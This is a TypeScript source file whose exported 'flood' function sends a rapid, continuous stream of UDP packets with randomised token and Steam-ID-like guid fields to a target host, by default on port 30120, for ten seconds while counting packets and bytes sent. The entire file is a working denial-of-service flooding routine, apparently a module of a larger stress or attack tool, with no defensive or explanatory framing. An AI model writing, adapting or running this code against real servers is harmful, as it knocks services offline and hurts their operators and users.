import * as dgram from "dgram"
import { randomUUID } from "crypto"

function parseUrl(url: string): { host: string; port: number } {
  const u = new URL(url.startsWith("http") ? url : `http://${url}`)
  return {
    host: u.hostname,
    port: parseInt(u.port) || 30120,
  }
}

export async function flood(
  url: string,
  _rpc: number,
  onStats: (req: number, bytes: number) => void
): Promise<void> {
  const { host, port } = parseUrl(url)

  return new Promise((resolve) => {
    const sock = dgram.createSocket("udp4")
    const send = () => {
      try {
        const token = randomUUID()
        const guid = String(Math.floor(76561197960265728 + Math.random() * 2000000000))
        const payload = Buffer.from(`token=${token}&guid=${guid}`, "utf-8")
        sock.send(payload, port, host, () => {
          onStats(1, payload.length)
          setImmediate(send)
        })
      } catch {
        sock.close()
        resolve()
      }
    }
    sock.on("error", () => resolve())
    send()
    setTimeout(() => {
      sock.close()
      resolve()
    }, 10000)
  })
}
